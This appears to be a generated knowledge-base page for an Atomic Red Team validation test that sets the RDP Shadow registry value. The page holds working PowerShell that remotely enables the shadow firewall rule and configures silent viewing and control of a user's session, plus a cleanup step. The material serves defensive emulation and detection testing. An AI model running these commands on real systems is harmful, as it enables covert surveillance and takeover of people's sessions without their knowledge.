---
atomic_guid: "ac494fe5-81a4-4897-af42-e774cf005ecb"
title: "Setting Shadow key in Registry for RDP Shadowing"
framework: "atomic"
generated: "true"
attack_technique_id: "T1112"
attack_technique_name: "Modify Registry"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "ac494fe5-81a4-4897-af42-e774cf005ecb"
  - "Setting Shadow key in Registry for RDP Shadowing"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Microsoft Remote Desktop Protocol (RDP) supports a “shadowing” feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.
In order to use the RDP shadowing feature, the Remote Desktop Services (TermService) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed.
In order to configure RDP shadowing session in a quiet mode.  The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the Shadow value in HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services on the remote machine to 2, which allows us to both view and control the session without the user being informed.
[Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)

## ATT&CK Mapping

- [[kb/attack/techniques/T1112-modify_registry|T1112: Modify Registry]]

## Input Arguments

### server_name

- description: The remote server that we need to shadow and have to do the registry modification.
- type: string
- default: localhost

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s | Invoke-CimMethod -MethodName Enable
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="shadow"; uValue=[uint32]2} -CimSession $s
```

### Cleanup

```powershell
Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml)
